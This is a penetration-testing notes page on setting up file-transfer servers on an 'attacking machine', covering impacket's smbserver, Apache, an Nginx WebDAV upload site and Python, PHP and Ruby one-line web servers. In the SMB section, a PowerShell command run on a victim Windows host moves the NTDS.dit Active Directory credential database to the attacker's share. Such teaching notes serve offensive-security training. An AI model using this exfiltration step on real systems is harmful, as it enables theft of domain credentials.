---
title: Setting up servers
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - servers
  - file transfer
---

# Setting up a server (in the attacking machine)

| **Protocol / app** |
| --- |
| [smb server](#smb-server) |
| [Apache server](#apache-server) |
| [ngix](#ngix) |
| [symple python server](#simple-python-server) |
| [php web server](#php-web-server) |
| [Ruby web server](#ruby-web-server) |
| Burp Suite Collaborator |
| [Interactsh](interactsh.md) | 

## smb server

[Launch smbserver in our attacker machine](smbserver.md):

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/
```

Now, from PS in the victim's windows machine we could upload a folder to the shared folder in the attacker machine just by running:

```powershell
cmd.exe /c move C:\NTDS\NTDS.dit \\$ip\CompData
```


## Apache server

Once you have a folder structure such as "/var/www/" or "/var/www/html", and also an Apache server installed, you can serve all files from that path by initiating the service:

```bash
# Start Apache
service apache2 start

# Stop Apache
service apache2 stop

# Restart Apache
service apache2 restart

# See status of Apache server
service apache2 status
```

In Apache, the PHP module loves to execute anything ending in PHP. Also, by default, with Apache, if we hit a directory without an index file (index.html), it will list all the files.

## Nginx

In Apache, the PHP module loves to execute anything ending in PHP. This is not very safe when allowing `HTTP` uploads, as we are trying to avoid that users cannot upload web shells and execute them.

```bash
# Create a Directory to Handle Uploaded Files
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# Change the Owner to www-data
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# Create Nginx Configuration File by creating the file /etc/nginx/sites-available/upload.conf with the contents:
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}

# Symlink our Site to the sites-enabled Directory
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# Start Nginx
sudo systemctl restart nginx.service

# If we get any error messages, check /var/log/nginx/error.log. we might see, for instance, port 80 is already in use.
```

Debuggin nginx:

First check: ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory

Second check: Is default port in nginx already in use?

```bash
# Verifying Errors
tail -2 `/var/log/nginx/error.log`
# and we might check that port 80 could not be binded because is already in use

# See which service is using port 80
ss -lnpt | grep `80`
# we will obtain the service and also the pid. For instance `2811`

# Check pid, for instance pid 2811, and see who is running it
ps -ef | grep "2811"

# Remove NginxDefault Configuration to get around this, we can remove the default Nginx configuration, which binds on port 80.
sudo rm /etc/nginx/sites-enabled/default
```

Finally you can copy to your nging server all files you want to transfer with curl:

```bash
curl -T file.txt
# -T, --upload-file <file>; This transfers the specified local file to the remote URL. -T uses PUT http method
```


## Simple python server

```shell-session
# Creating a Web Server with Python3
cd /tmp
python3 -m http.server 8000

# Creating a Web Server with Python2.7
python2.7 -m SimpleHTTPServer
```


##  PHP web server

```shell-session
php -S 0.0.0.0:8000
```


## Ruby Web Server

```shell-session
ruby -run -ehttpd . -p8000
```

